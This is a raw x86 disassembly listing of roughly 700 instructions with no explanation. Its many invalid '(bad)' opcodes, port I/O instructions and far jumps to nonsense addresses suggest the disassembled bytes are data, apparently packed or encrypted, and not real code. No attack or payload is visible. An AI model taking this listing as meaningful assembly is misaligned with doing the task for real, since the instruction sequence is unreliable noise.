  42194b:	add    eax,0xfdb97c68
  421950:	mov    DWORD PTR [eax+0xd9dcacb],edx
  421956:	in     eax,dx
  421957:	mul    DWORD PTR [ecx-0xd4c0dfb]
  42195d:	push   ss
  42195e:	shl    edi,cl
  421960:	push   esi
  421961:	mov    edi,0xb242046b
  421966:	arpl   WORD PTR [ebx+0x71],bp
  421969:	sbb    eax,0xbd3ab079
  42196e:	leave  
  42196f:	imul   esp,ebx,0xffffffce
  421972:	and    al,0x63
  421974:	jge    0x4219f4
  421976:	retf   0x2835
  421979:	das    
  42197a:	ror    edi,cl
  42197c:	je     0x421928
  42197e:	cwde   
  42197f:	call   0xe7316863
  421984:	out    dx,al
  421985:	push   cs
  421986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421987:	sbb    BYTE PTR ds:0xe3c7763f,cl
  42198d:	in     eax,0x28
  42198f:	leave  
  421990:	cdq    
  421991:	arpl   WORD PTR [edi],dx
  421993:	leave  
  421994:	retf   
  421995:	cli    
  421996:	jb     0x421970
  421998:	rcr    DWORD PTR [edx],1
  42199a:	(bad)  
  42199b:	js     0x421982
  42199d:	aam    0x28
  42199f:	push   ebp
  4219a0:	lock mov ds:0x6ee065,eax
  4219a6:	mov    ebx,0xd96ad238
  4219ab:	in     eax,0x12
  4219ad:	cmc    
  4219ae:	(bad)  
  4219af:	sti    
  4219b0:	inc    eax
  4219b1:	xchg   ebp,eax
  4219b2:	push   ss
  4219b3:	in     eax,0xed
  4219b5:	xor    eax,0xf756fe2f
  4219ba:	adc    edx,DWORD PTR [ebx+0xb]
  4219bd:	mov    ds:0xae906f37,eax
  4219c2:	sub    DWORD PTR [ebp-0x18],ecx
  4219c5:	mov    ch,0x59
  4219c7:	nop
  4219c8:	adc    ch,BYTE PTR ds:0xb5cbde99
  4219ce:	lds    eax,FWORD PTR [eax+0x1088f891]
  4219d4:	cmp    esp,0x6c
  4219d7:	dec    ebx
  4219d8:	in     eax,0xab
  4219da:	and    eax,0x153e9afe
  4219df:	shl    eax,1
  4219e1:	mov    dh,0xd4
  4219e3:	jl     0x42197c
  4219e5:	inc    esp
  4219e6:	xor    eax,0x813a637e
  4219eb:	inc    ebx
  4219ec:	leave  
  4219ed:	mov    edi,DWORD PTR [edx+0x3f]
  4219f0:	xor    eax,0x4ce316a6
  4219f5:	lea    esp,[edx]
  4219f7:	and    dh,BYTE PTR [eax]
  4219f9:	mov    bl,0xe1
  4219fb:	int3   
  4219fc:	mov    ecx,0x63af8a08
  421a01:	in     eax,0x1c
  421a03:	xchg   ecx,eax
  421a04:	in     eax,dx
  421a05:	cmc    
  421a06:	and    al,0xea
  421a08:	mov    eax,0x9303e28f
  421a0d:	loopne 0x4219de
  421a0f:	sbb    esp,DWORD PTR [eax-0x69e95ca4]
  421a15:	cmp    ch,bh
  421a17:	mov    edx,DWORD PTR [ecx-0x59]
  421a1a:	call   0x5aa:0x4c4482d4
  421a21:	mov    ebx,0x628da1b5
  421a26:	jb     0x4219ac
  421a28:	(bad)  [ecx-0x52dbccb0]
  421a2e:	push   esi
  421a2f:	(bad)  
  421a30:	and    al,0x6f
  421a32:	leave  
  421a33:	xchg   BYTE PTR [ebp-0x435cc950],al
  421a39:	fwait
  421a3a:	push   esi
  421a3b:	jg     0x421a27
  421a3d:	sbb    ch,BYTE PTR [esi-0x42c999d8]
  421a43:	jecxz  0x421a8b
  421a45:	mov    ch,0x3d
  421a47:	in     al,0xa9
  421a49:	mov    cl,0xd5
  421a4b:	xchg   ebp,eax
  421a4c:	bound  esi,QWORD PTR [eax]
  421a4e:	and    ecx,eax
  421a50:	jno    0x421a3e
  421a52:	sub    eax,0x6daaece2
  421a57:	xchg   esi,eax
  421a58:	shl    DWORD PTR [ecx-0x6],cl
  421a5b:	sbb    DWORD PTR [ecx+edx*1+0x3fe2e0b9],ecx
  421a62:	sbb    eax,0x89814f75
  421a67:	mov    es,WORD PTR [esi+eiz*4]
  421a6a:	jg     0x421a4a
  421a6c:	test   BYTE PTR ds:0x26379837,0xd3
  421a73:	lock mov WORD PTR [edx+ecx*4-0x3f519549],ss
  421a7b:	test   BYTE PTR [ebp-0xa009e92],al
  421a81:	in     al,0x4
  421a83:	push   cs
  421a84:	(bad)  
  421a85:	mov    bh,0xaf
  421a87:	aas    
  421a88:	cmc    
  421a89:	mov    ebp,0x470a258b
  421a8e:	enter  0x7989,0x75
  421a92:	mov    edx,0xeaec8c62
  421a97:	(bad)  
  421a99:	pushf  
  421a9a:	add    eax,0x6671dc98
  421a9f:	fst    DWORD PTR [esi]
  421aa1:	mov    dh,0x8e
  421aa3:	dec    ecx
  421aa4:	and    bh,cl
  421aa6:	mov    dh,0xa
  421aa8:	push   esi
  421aa9:	(bad)  
  421aaa:	cwde   
  421aab:	cmp    BYTE PTR [edx+0x54],bl
  421aae:	adc    eax,0xa4466fd0
  421ab3:	and    bl,ch
  421ab5:	leave  
  421ab6:	push   edx
  421ab7:	jmp    0x421a4c
  421ab9:	pop    ss
  421aba:	xor    ebp,0xbaa92d18
  421ac0:	add    al,0x5e
  421ac2:	push   ds
  421ac3:	mov    al,0x61
  421ac5:	adc    dh,0xec
  421ac8:	mov    eax,0x7a5a68c2
  421acd:	shl    eax,cl
  421acf:	out    0x93,eax
  421ad1:	cmp    ch,BYTE PTR [esi+ebx*4+0x3c93fb13]
  421ad8:	mov    ebx,DWORD PTR [ebx+ebp*4-0x6ef74f74]
  421adf:	ror    BYTE PTR [edx],0xa8
  421ae2:	xchg   ebp,eax
  421ae3:	add    dh,bh
  421ae5:	mov    ebp,0xec5ba756
  421aea:	mov    bl,0x6b
  421aec:	lahf   
  421aed:	or     esp,DWORD PTR [esi-0x25]
  421af0:	adc    al,0x15
  421af2:	pop    ebp
  421af3:	adc    al,0x7f
  421af5:	imul   ebp,DWORD PTR [ecx],0xb1fdfcdf
  421afb:	mov    ah,0x64
  421afd:	test   eax,0xd941e21b
  421b02:	sbb    al,0x8d
  421b04:	pop    esi
  421b05:	test   BYTE PTR [ecx+esi*1+0x6a90787f],dh
  421b0c:	ret    
  421b0d:	xchg   esi,eax
  421b0e:	mov    eax,ds:0xcbecfb45
  421b13:	pushf  
  421b14:	cmovno esp,esi
  421b17:	xchg   ebx,eax
  421b18:	loope  0x421b04
  421b1a:	sub    eax,0x65927763
  421b1f:	pop    esp
  421b20:	mov    ecx,0x640be786
  421b25:	mov    dl,0x96
  421b27:	cld    
  421b28:	cmp    ecx,DWORD PTR [edi]
  421b2a:	xchg   esp,eax
  421b2b:	ret    
  421b2c:	push   esi
  421b2d:	stos   DWORD PTR es:[edi],eax
  421b2e:	cld    
  421b2f:	jo     0x421b8e
  421b31:	xchg   ecx,eax
  421b32:	ret    0x8deb
  421b35:	das    
  421b36:	aad    0x58
  421b38:	rcl    BYTE PTR [edx+0x11],1
  421b3b:	retf   0xccfe
  421b3e:	xchg   edi,eax
  421b3f:	test   eax,0xba83d800
  421b44:	leave  
  421b45:	popa   
  421b46:	jg     0x421b61
  421b48:	mov    ecx,0xd25f537f
  421b4d:	(bad)
  421b50:	xchg   ecx,eax
  421b51:	push   ebx
  421b52:	and    al,0x3c
  421b54:	(bad)  
  421b56:	xchg   ecx,eax
  421b57:	jmp    0x93ecd3e1
  421b5c:	ss inc ebx
  421b5e:	sbb    BYTE PTR [edi-0x70],ah
  421b61:	dec    eax
  421b62:	lods   eax,DWORD PTR ds:[esi]
  421b63:	adc    esp,ebx
  421b65:	adc    esp,DWORD PTR [ebx-0x6528d4ba]
  421b6b:	sbb    dl,BYTE PTR [ebp+0x6dca0d4]
  421b71:	imul   edi,DWORD PTR [edi+0x52814175],0x4536864b
  421b7b:	add    eax,0xe2a4fe4f
  421b80:	add    ebp,edi
  421b82:	mov    bh,BYTE PTR [edx+0x10f5ef6f]
  421b88:	push   ds
  421b89:	jle    0x421bd3
  421b8b:	fs daa 
  421b8d:	mov    dh,0x52
  421b8f:	pop    eax
  421b90:	jge    0x421b9f
  421b92:	sub    al,0x22
  421b94:	loopne 0x421b48
  421b96:	aad    0xf2
  421b98:	popf   
  421b99:	or     esi,DWORD PTR fs:[esi+0x7efe94b6]
  421ba0:	sub    ebp,DWORD PTR [ebx-0x7c]
  421ba3:	cmp    eax,esp
  421ba5:	lea    edi,[ebx]
  421ba7:	lods   eax,DWORD PTR ds:[esi]
  421ba8:	mov    WORD PTR [ebx+0x5b693f22],cs
  421bae:	(bad)  
  421baf:	nop
  421bb0:	neg    ebp
  421bb2:	add    ah,BYTE PTR [ecx]
  421bb4:	(bad)  
  421bb5:	pop    ebx
  421bb6:	xor    ecx,0xb1ed36fe
  421bbc:	push   ss
  421bbd:	out    dx,al
  421bbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bbf:	stc    
  421bc0:	xchg   esp,eax
  421bc1:	dec    ebp
  421bc2:	mov    ebp,0x911c5d6c
  421bc7:	aas    
  421bc8:	nop
  421bc9:	or     DWORD PTR [eax],0x4d1e32aa
  421bcf:	xchg   esi,esp
  421bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bd2:	gs dec esp
  421bd4:	(bad)  [edx-0x67]
  421bd7:	call   0x889e:0x5882c90e
  421bde:	xor    eax,0xf5ccc92
  421be3:	out    0x52,eax
  421be5:	xor    edi,0xffffffdc
  421be8:	ret    
  421be9:	mov    eax,esi
  421beb:	xchg   edx,eax
  421bec:	mov    cl,0x2b
  421bee:	or     al,0x4c
  421bf0:	arpl   WORD PTR [ebx],dx
  421bf2:	lods   eax,DWORD PTR ds:[esi]
  421bf3:	and    bl,BYTE PTR [ecx]
  421bf5:	mov    BYTE PTR [esi],bl
  421bf7:	adc    eax,0x74914ac4
  421bfc:	sub    eax,0x3f2b5c87
  421c01:	sub    BYTE PTR [ebp-0x12],bh
  421c04:	sahf   
  421c05:	cli    
  421c06:	lahf   
  421c07:	push   es
  421c08:	dec    esi
  421c09:	sub    ebp,eax
  421c0b:	cmp    dh,BYTE PTR [ebx-0x24]
  421c0e:	dec    bp
  421c10:	adc    eax,0x5008e9e0
  421c15:	mov    ebx,0x6c601ade
  421c1a:	push   ds
  421c1b:	mov    edi,0xb7260a48
  421c20:	test   cl,dl
  421c22:	ins    BYTE PTR es:[edi],dx
  421c23:	mov    bl,0xee
  421c25:	inc    esi
  421c26:	sbb    DWORD PTR [ecx+0x9163179],esp
  421c2c:	add    ch,BYTE PTR [eax]
  421c2e:	pushf  
  421c2f:	mov    BYTE PTR [edi-0x71],dl
  421c32:	push   cs
  421c33:	push   ecx
  421c34:	jmp    0x72f7af90
  421c39:	cli    
  421c3a:	ja     0x421c00
  421c3c:	retf   
  421c3d:	imul   ebp,DWORD PTR [ebx+eax*1],0x20
  421c41:	pcmpeqb mm1,QWORD PTR [ecx+0x0]
  421c45:	js     0x421c69
  421c47:	and    cl,BYTE PTR es:[edx]
  421c4a:	lods   eax,DWORD PTR ds:[esi]
  421c4b:	inc    ebx
  421c4c:	ret    
  421c4d:	cwde   
  421c4e:	pop    ss
  421c4f:	int    0xb1
  421c51:	(bad)
  421c55:	(bad)  
  421c57:	jbe    0x421c98
  421c59:	mov    ch,0x6f
  421c5b:	add    esp,esp
  421c5d:	hlt    
  421c5e:	adc    al,0x7e
  421c60:	dec    esp
  421c61:	(bad)  
  421c62:	ficom  DWORD PTR [eax-0xf]
  421c65:	std    
  421c66:	sahf   
  421c67:	int    0xc8
  421c69:	enter  0x9f6,0x91
  421c6d:	dec    esp
  421c6e:	add    eax,0x666de2aa
  421c73:	jmp    0xdf87:0x9e45d5f4
  421c7a:	pop    ebx
  421c7b:	pop    edi
  421c7c:	sahf   
  421c7d:	mov    ch,0x2e
  421c7f:	mov    eax,0x3502a372
  421c84:	xchg   ebx,eax
  421c85:	lods   eax,DWORD PTR ds:[esi]
  421c86:	rol    DWORD PTR [esi+0x65113f36],cl
  421c8c:	jle    0x421c25
  421c8e:	push   ss
  421c8f:	cmp    edx,DWORD PTR [esi-0x5a5c68bb]
  421c95:	scas   al,BYTE PTR es:[edi]
  421c96:	mov    ebx,edx
  421c98:	jp     0x421d16
  421c9a:	(bad)  
  421c9b:	ja     0x421ce1
  421c9d:	mov    ah,BYTE PTR [eax-0x309a008f]
  421ca3:	fs dec edx
  421ca5:	addr16 ja 0x421cb1
  421ca8:	adc    al,0x5c
  421caa:	inc    ecx
  421cab:	jnp    0x421c70
  421cad:	aas    
  421cae:	push   0x57e6eb8d
  421cb3:	jl     0x421c7c
  421cb5:	mov    ah,0x1f
  421cb7:	into   
  421cb8:	xchg   ebp,eax
  421cb9:	add    eax,0x5f2d4170
  421cbe:	jg     0x421cb6
  421cc0:	jl     0x421c8b
  421cc2:	xchg   esp,eax
  421cc3:	pop    ebp
  421cc4:	push   ebp
  421cc5:	mov    edx,0x2be15bc6
  421cca:	out    0x7b,eax
  421ccc:	push   edi
  421ccd:	mov    eax,ds:0xf3aa600b
  421cd2:	mov    DWORD PTR [edx],ebx
  421cd4:	leave  
  421cd5:	test   DWORD PTR [esi+ebp*1],ecx
  421cd8:	xchg   esp,eax
  421cd9:	fwait
  421cda:	sti    
  421cdb:	(bad)  
  421cdd:	sbb    al,0xc3
  421cdf:	xchg   edx,eax
  421ce0:	and    ebx,DWORD PTR [ebp-0x2a]
  421ce3:	mov    ebx,ebx
  421ce5:	xchg   ecx,eax
  421ce6:	aad    0x7
  421ce8:	jne    0x421d5e
  421cea:	push   es
  421ceb:	test   ebx,esi
  421ced:	das    
  421cee:	dec    esp
  421cef:	pop    ebx
  421cf0:	mov    eax,0x4c11af33
  421cf5:	jne    0x421cb5
  421cf7:	lods   eax,DWORD PTR ds:[esi]
  421cf8:	(bad)  
  421cf9:	cli    
  421cfa:	scas   al,BYTE PTR es:[edi]
  421cfb:	cmp    BYTE PTR [eax],bh
  421cfd:	out    0x7f,eax
  421cff:	ror    esp,cl
  421d01:	pop    esi
  421d02:	and    BYTE PTR [ecx-0x56],0xd1
  421d06:	sub    ebx,esi
  421d08:	addr16 pop es
  421d0a:	xor    eax,0xae75c370
  421d0f:	cli    
  421d10:	jno    0x421d91
  421d12:	push   DWORD PTR [edi+0x24218bd8]
  421d18:	lods   al,BYTE PTR ds:[esi]
  421d19:	rcr    BYTE PTR [ecx],0xa5
  421d1c:	sbb    ah,BYTE PTR [ebx]
  421d1e:	fidiv  DWORD PTR [edi+0x3f51168]
  421d24:	jns    0x421d24
  421d26:	xor    DWORD PTR [ebp-0xc],edx
  421d29:	add    DWORD PTR [ebx],edi
  421d2b:	int    0xe4
  421d2d:	push   edi
  421d2e:	dec    edx
  421d2f:	in     eax,dx
  421d30:	mov    ds:0x15690632,al
  421d35:	mov    DWORD PTR [ebx-0x5c],edx
  421d38:	imul   ebp,DWORD PTR [edx+0x37],0xffffffbf
  421d3c:	clc    
  421d3d:	and    al,0xa0
  421d3f:	sahf   
  421d40:	inc    esi
  421d41:	adc    DWORD PTR [ebp+ecx*1-0x69],edi
  421d45:	sub    esi,DWORD PTR [ecx+0x2640d48c]
  421d4b:	fwait
  421d4c:	icebp  
  421d4d:	leave  
  421d4e:	ja     0x421cdd
  421d50:	and    esp,edx
  421d52:	imul   esp,DWORD PTR [esi+0xcbd5e9b],0x9
  421d59:	mov    ecx,0x70984c80
  421d5e:	dec    edi
  421d5f:	mov    bl,0x82
  421d61:	pop    esi
  421d62:	aam    0x51
  421d64:	inc    ecx
  421d65:	add    DWORD PTR [esi+0x45],edi
  421d68:	popf   
  421d69:	dec    BYTE PTR [edx-0x77]
  421d6c:	pop    ebx
  421d6d:	pop    ebp
  421d6e:	sbb    DWORD PTR [ecx+0xf461db3],edx
  421d74:	bound  ebp,QWORD PTR [ebx-0x7b]
  421d77:	xchg   esp,eax
  421d78:	mov    ah,0x80
  421d7a:	loopne 0x421da3
  421d7c:	mov    esi,0xb01ba2bf
  421d81:	test   DWORD PTR [esi-0x23ea0ad0],esp
  421d87:	js     0x421df4
  421d89:	imul   ecx,DWORD PTR [eax+edi*2-0x63],0xffffff83
  421d8e:	retf   0x964e
  421d91:	(bad)  
  421d92:	cli    
  421d93:	sub    esp,0x1333a7c0
  421d99:	inc    esp
  421d9a:	sbb    edi,ebp
  421d9c:	xchg   edi,eax
  421d9d:	sub    DWORD PTR [esi],esp
  421d9f:	add    eax,0xbf8f47b9
  421da4:	mov    dh,0x20
  421da6:	push   ebx
  421da7:	xchg   edi,eax
  421da8:	sub    DWORD PTR [eax+0x6f31d6c3],ebx
  421dae:	pop    eax
  421daf:	aad    0xe6
  421db1:	mov    al,ds:0x7261bc69
  421db6:	xchg   ebp,eax
  421db7:	pop    ebp
  421db8:	mov    eax,ds:0x8b6b5170
  421dbd:	test   al,0xbd
  421dbf:	outs   dx,BYTE PTR ds:[esi]
  421dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dc1:	and    eax,0x24c32ad
  421dc6:	add    dl,cl
  421dc8:	mov    dh,0xec
  421dca:	jl     0x421dbc
  421dcc:	mov    cl,0x6b
  421dce:	sbb    DWORD PTR [edi+0x49],ecx
  421dd1:	std    
  421dd2:	arpl   WORD PTR [ebx+0x1a],di
  421dd5:	arpl   WORD PTR [eax],dx
  421dd7:	std    
  421dd8:	and    ah,cl
  421dda:	push   edi
  421ddb:	mov    ds:0x870c9e1e,eax
  421de0:	sub    ecx,esp
  421de2:	cmp    DWORD PTR [ebx-0x31],ecx
  421de5:	mov    ch,0xdc
  421de7:	out    dx,al
  421de8:	add    BYTE PTR [ecx],ch
  421dea:	dec    esp
  421deb:	jmp    0xc824:0x28d4740e
  421df2:	ror    bl,cl
  421df4:	inc    edx
  421df5:	xchg   edi,eax
  421df6:	loopne 0x421de8
  421df8:	xchg   edi,eax
  421df9:	stos   BYTE PTR es:[edi],al
  421dfa:	rol    BYTE PTR [ecx+edi*8+0x1c],1
  421dfe:	push   edx
  421dff:	jle    0x421db4
  421e01:	frstor [edx-0x6602eb51]
  421e07:	cmp    BYTE PTR ds:0x7cb826ee,dl
  421e0d:	xchg   esi,eax
  421e0e:	sbb    eax,0x2e3daf27
  421e13:	pop    ecx
  421e14:	push   ss
  421e15:	repz ret 0x5d80
  421e19:	add    esp,DWORD PTR [esi+esi*4]
  421e1c:	retf   0xd77d
  421e1f:	mov    DWORD PTR [eax+esi*1+0x1ce07500],ecx
  421e26:	dec    edi
  421e27:	iret   
  421e28:	pushf  
  421e29:	test   BYTE PTR [edx+0x30373d35],dl
  421e2f:	add    BYTE PTR [edx],al
  421e31:	jno    0x421ea2
  421e33:	or     DWORD PTR [eax],eax
  421e35:	dec    BYTE PTR [ebp-0x1f3b7ce3]
  421e3b:	outs   dx,BYTE PTR ds:[esi]
  421e3c:	push   eax
  421e3d:	icebp  
  421e3e:	fidivr WORD PTR [ecx]
  421e40:	dec    ebp
  421e41:	idiv   BYTE PTR [esi+edi*2-0x6]
  421e45:	push   ecx
  421e46:	push   0x6f0daa2c
  421e4b:	jbe    0x421e4f
  421e4d:	cdq    
  421e4e:	aaa    
  421e4f:	push   ebx
  421e50:	inc    ecx
  421e51:	mov    esp,0xb8bbca66
  421e56:	test   ebp,ebp
  421e58:	cmp    esp,eax
  421e5a:	mov    ebx,0x65056c9e
  421e5f:	retf   
  421e60:	pop    ebp
  421e61:	pop    ss
  421e62:	jmp    0x421e99
  421e64:	lahf   
  421e65:	retf   0xdf44
  421e68:	ror    al,0xd7
  421e6b:	ret    0x9e3e
  421e6e:	imul   ch
  421e70:	imul   eax,DWORD PTR [edx],0xffffffcd
  421e73:	inc    ebp
  421e74:	repz mov ah,0x3e
  421e77:	mov    ebx,DWORD PTR cs:[eax]
  421e7a:	rol    DWORD PTR ds:0xb344be70,0x42
  421e81:	sbb    eax,0xdd428068
  421e86:	in     al,dx
  421e87:	adc    eax,0xaab23efa
  421e8c:	fistp  QWORD PTR [ecx-0x4f]
  421e8f:	setb   BYTE PTR [ecx]
  421e92:	and    bh,dl
  421e94:	sub    ebx,ebp
  421e96:	cdq    
  421e97:	mov    al,ds:0xd0815f54
  421e9c:	(bad)
  421ea0:	ret    0xd317
  421ea3:	cwde   
  421ea4:	mov    al,0x42
  421ea6:	std    
  421ea7:	enter  0x240b,0x41
  421eab:	iret   
  421eac:	jmp    0x7e70:0x5859b252
  421eb3:	mov    DWORD PTR [edi+0x1de679c0],ebp
  421eb9:	mov    bl,0xe7
  421ebb:	into   
  421ebc:	jo     0x421e57
  421ebe:	cld    
  421ebf:	aaa    
  421ec0:	xchg   edx,eax
  421ec1:	sub    bh,ch
  421ec3:	jns    0x421e6e
  421ec5:	mov    ebp,0x25779602
  421eca:	inc    ebp
  421ecb:	xor    DWORD PTR [ebx-0x62],0xe28465d0
  421ed2:	adc    al,0x8f
  421ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed5:	jp     0x421efc
  421ed7:	xchg   BYTE PTR [ebx+0x3567857],dl
  421edd:	retf   
  421ede:	xchg   ebp,eax
  421edf:	sbb    eax,edx
  421ee1:	pop    es
  421ee2:	sub    BYTE PTR [edx],dl
  421ee4:	mov    ebp,0x235aeeca
  421ee9:	pop    ebp
  421eea:	or     BYTE PTR [edx],dl
  421eec:	jecxz  0x421f57
  421eee:	sub    DWORD PTR [ebx],ebp
  421ef0:	cmp    BYTE PTR [ebx-0x2bfba7ba],ch
  421ef6:	jl     0x421eae
  421ef8:	xor    BYTE PTR [eax-0x17],dl
  421efb:	inc    ecx
  421efc:	mov    ds,eax
  421efe:	in     eax,dx
  421eff:	fistp  DWORD PTR [esi+0x30]
  421f02:	mov    ebp,DWORD PTR [ebp+0x39]
  421f05:	jne    0x421eb8
  421f07:	test   eax,0x3d1973a2
  421f0c:	add    ch,BYTE PTR [ebx+edx*2+0x75]
  421f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f11:	dec    eax
  421f12:	push   ebp
  421f13:	sbb    ecx,eax
  421f15:	pop    esi
  421f16:	mov    dh,0x46
  421f18:	push   edi
  421f19:	repnz push eax
  421f1b:	(bad)  [ebx+0xb4ade23]
  421f21:	mov    dh,0x16
  421f23:	stos   BYTE PTR es:[edi],al
  421f24:	xor    ebp,esp
  421f26:	sub    al,0x7b
  421f28:	xor    dh,dl
  421f2a:	daa    
  421f2b:	sti    
  421f2c:	xchg   ebx,eax
  421f2d:	inc    esi
  421f2e:	test   eax,0x6a490318
  421f33:	js     0x421f7b
  421f35:	jg     0x421ec8
  421f37:	test   al,0xf9
  421f39:	leave  
  421f3a:	shr    esp,1
  421f3c:	ret    
  421f3d:	jl     0x421ebf
  421f3f:	lds    eax,FWORD PTR [edi+0x8]
  421f42:	adc    al,0x94
  421f44:	lods   eax,DWORD PTR ds:[esi]
  421f45:	test   al,0xb3
  421f47:	pop    ds
  421f48:	sub    edi,edi
  421f4a:	es sbb eax,0x798aadc3
  421f50:	fldcw  WORD PTR [eax+eax*4+0xf69a07d]
  421f57:	push   0xffffff96
  421f59:	fistp  DWORD PTR [ecx]
  421f5b:	nop
  421f5c:	inc    eax
  421f5d:	jnp    0x421f37
  421f5f:	popf   
  421f60:	add    eax,0x58d81295
  421f65:	mov    bl,0xb0
  421f67:	fisttp DWORD PTR [esi-0x2c10f35a]
  421f6d:	out    dx,eax
  421f6e:	out    dx,eax
  421f6f:	add    esi,DWORD PTR [edx+0x2a]
  421f72:	adc    al,0x7b
  421f74:	idiv   BYTE PTR [ecx+eax*8+0x23]
  421f78:	jle    0x421f73
  421f7a:	mov    dl,bh
  421f7c:	cmp    eax,0xe8df50af
  421f81:	and    al,0x41
  421f83:	mov    bl,0x79
  421f85:	daa    
  421f86:	dec    ebp
  421f87:	sbb    bl,al
  421f89:	mul    BYTE PTR [ebp-0x7c6eaaf3]
  421f8f:	cmp    bl,BYTE PTR [eax-0x56]
  421f92:	xor    esp,ebp
  421f94:	test   DWORD PTR [edi+0x2f],ebp
  421f97:	ja     0x421f83
  421f99:	dec    eax
  421f9a:	in     al,0x9a
  421f9c:	mov    ebp,0x9ad7988a
  421fa1:	dec    ebx
  421fa2:	aas    
  421fa3:	test   BYTE PTR [ecx],0x6b
  421fa6:	pusha  
  421fa7:	daa    
  421fa8:	jmp    0xcfea:0xb15b8a6c
  421faf:	dec    ebx
  421fb0:	(bad)  
  421fb1:	adc    ebx,ebp
  421fb3:	es inc ebx
  421fb5:	int3   
  421fb6:	jne    0x422026
  421fb8:	(bad)  
  421fb9:	cmp    al,0xbf
  421fbb:	loope  0x42203c
  421fbd:	fsub   QWORD PTR [edx+ecx*8+0x6e1dc9e1]
  421fc4:	pop    ss
  421fc5:	mov    al,ds:0x2f86ce2d
  421fca:	sub    BYTE PTR [ebx],ch
  421fcc:	adc    esi,DWORD PTR [edi+0xc]
  421fcf:	test   al,0x49
  421fd1:	mov    bh,0x59
  421fd3:	sub    al,dl
  421fd5:	test   BYTE PTR [edx-0x2f84c3b3],bl
  421fdb:	adc    ah,BYTE PTR [edi-0x7d]
  421fde:	dec    edi
  421fdf:	in     eax,0x7e
  421fe1:	add    ecx,DWORD PTR [esi]
  421fe3:	popa   
  421fe4:	test   DWORD PTR [eax-0x15ce500e],edx
  421fea:	out    dx,eax
  421feb:	mov    esp,0xd643dd9a
  421ff0:	xchg   edx,eax
  421ff1:	dec    esi
  421ff2:	bound  ecx,QWORD PTR [eax+0x29]
  421ff5:	mov    eax,0xddffec3a
  421ffa:	or     BYTE PTR [ebp-0x5ce28188],ah
  422000:	sbb    eax,0x7612d880
  422005:	or     ch,BYTE PTR [ecx+0x2cc35500]
  42200b:	xor    ah,BYTE PTR [edi-0x49]
  42200e:	sbb    ebp,ecx
  422010:	mov    al,ds:0x815e4450
  422015:	das    
  422016:	inc    ebx
  422017:	mov    cl,0x6e
  422019:	jl     0x421ff2
  42201b:	pop    ebx
  42201c:	add    BYTE PTR cs:[edx+eax*4-0x64e45e88],cl
  422024:	push   ss
  422025:	test   BYTE PTR [ecx-0x730eced9],0x57
  42202c:	cmp    BYTE PTR [esi+0x78],ch
  42202f:	les    ebx,FWORD PTR [esi+ebx*1-0x4e]
  422033:	out    dx,al
  422034:	cwde   
  422035:	stos   BYTE PTR es:[edi],al
  422036:	pop    eax
  422037:	pop    esi
  422038:	cli    
  422039:	jecxz  0x422011
  42203b:	cs inc esp
  42203d:	mov    al,al
  42203f:	dec    DWORD PTR [edx-0x6e]
  422042:	into   
  422043:	and    DWORD PTR [ebp-0x2f],eax
  422046:	sbb    BYTE PTR [eiz*1+0x2a553f30],dl
  42204d:	pop    ebp
  42204e:	and    ebp,DWORD PTR [esi+0x1a1ff959]
  422054:	add    BYTE PTR [edi+ebx*1],bl
  422057:	jne    0x422000
  422059:	test   DWORD PTR [ecx],eax
  42205b:	fild   QWORD PTR [esi]
  42205d:	out    0x6e,eax
  42205f:	out    0xd6,al
  422061:	std    
  422062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422063:	dec    esi
  422064:	in     eax,dx
  422065:	stos   DWORD PTR es:[edi],eax
  422066:	inc    edi
  422067:	(bad)  
  422068:	fldcw  WORD PTR [esi-0x47]
  42206b:	push   ebp
  42206c:	jns    0x422005
  42206e:	sub    eax,0x13408aed
  422073:	or     bl,BYTE PTR [eax+eiz*2-0x3aefb007]
  42207a:	and    dl,BYTE PTR [eax+0x7697365d]
  422080:	xchg   ebx,eax
  422081:	ss cwde 
  422083:	in     al,dx
  422084:	or     eax,0xf1e04dce
  422089:	fbstp  TBYTE PTR [edi-0x3c87c5cf]
  42208f:	mov    cl,0x1e
  422091:	push   cs
  422092:	xchg   ecx,eax
  422093:	aaa    
  422094:	popf   
  422095:	nop
  422096:	bound  eax,QWORD PTR [ebx+0x6ccbea3a]
  42209c:	or     BYTE PTR [edx],bh
  42209e:	std    
  42209f:	xor    esi,0xffffff89
  4220a2:	push   esi
  4220a3:	lahf   
  4220a4:	(bad)  
  4220a6:	cmp    BYTE PTR ds:0x581154a2,dh
  4220ac:	loop   0x42204c
  4220ae:	enter  0x5cb3,0xd1
  4220b2:	and    esp,ebx
  4220b4:	mov    ecx,0xae16dfd5
  4220b9:	mov    ah,al
  4220bb:	push   0x499de174
  4220c0:	cld    
  4220c1:	mov    edx,0x969b93a
  4220c6:	icebp  
  4220c7:	call   esi
  4220c9:	lods   eax,DWORD PTR ds:[esi]
  4220ca:	and    DWORD PTR [ecx-0x75],edi
  4220cd:	sbb    eax,0x54022194
  4220d2:	push   0x595c8e17
  4220d7:	popf   
  4220d8:	pushf  
  4220d9:	(bad)  
  4220db:	cs adc eax,0x30b735ea
  4220e1:	xchg   edx,eax
  4220e2:	mov    ebx,0x3ce5539b
  4220e7:	test   BYTE PTR [esi],al
  4220e9:	inc    esi
  4220ea:	dec    eax
  4220eb:	pop    esi
  4220ec:	lock jmp 0xd580a4f
  4220f2:	popa   
  4220f3:	xor    BYTE PTR [edi-0x32],0xbf
  4220f7:	repnz mov dh,0x93
  4220fa:	sub    dl,bh
  4220fc:	and    eax,0xf3e01cd2
  422101:	mov    cl,0xa5
  422103:	imul   ebx,ebx,0x974beaca
  422109:	pop    ds
  42210a:	jge    0x42211c
  42210c:	push   ss
  42210d:	scas   eax,DWORD PTR es:[edi]
  42210e:	repz or DWORD PTR [ebx-0x7a],ebx
  422112:	arpl   WORD PTR [eax],sp
  422114:	nop
  422115:	xchg   ah,ah
  422117:	sub    DWORD PTR [eax+0x6d],0x2b05d8a4
  42211e:	push   eax
  42211f:	call   0x5e0eec4f
  422124:	mov    al,ds:0xaab1adab
  422129:	out    0x5c,eax
  42212b:	dec    ecx
  42212c:	out    dx,al
  42212d:	mov    ebx,0x851fccac
  422132:	dec    edx
  422133:	push   edx
  422134:	call   0x37da:0xeea2ae82
